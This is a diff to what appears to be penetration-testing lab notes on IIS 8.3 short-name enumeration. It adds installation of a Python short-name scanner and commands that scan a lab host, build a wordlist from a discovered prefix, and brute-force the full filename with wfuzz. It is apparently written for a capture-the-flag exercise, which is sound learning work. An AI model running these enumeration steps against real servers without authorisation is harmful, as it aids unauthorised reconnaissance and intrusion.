@@ -20,12 +20,22 @@ Host: target.com
 ```
 ## 2. Automated Enumeration
 **Goal:** Efficiently brute-force the 8.3 short names using automated tools.
-### Using IIS-ShortName-Scanner
+### Using IIS_shortname_Scanner
 This Java-based tool automates the recursive discovery of short names.
 ```shell
+# Installation
+git clone https://github.com/lijiejie/IIS_shortname_Scanner
+cd IIS_shortname_Scanner
+
 # Description: Execute automated shortname scan
-# Syntax: java -jar iis_shortname_scanner.jar <Threads> <Mode> <URL>
-java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+# Syntax: python3 iis_shortname_scan.py <DB URL>
+python3 iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
+
+# Create wordlist (we found poo_co~1.txt, the file name start with co)
+grep "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_wordlist.txt 
+
+# Find full filename
+wfuzz -c -w co_wordlist.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
 ```
 
 **Interpreting Results:**
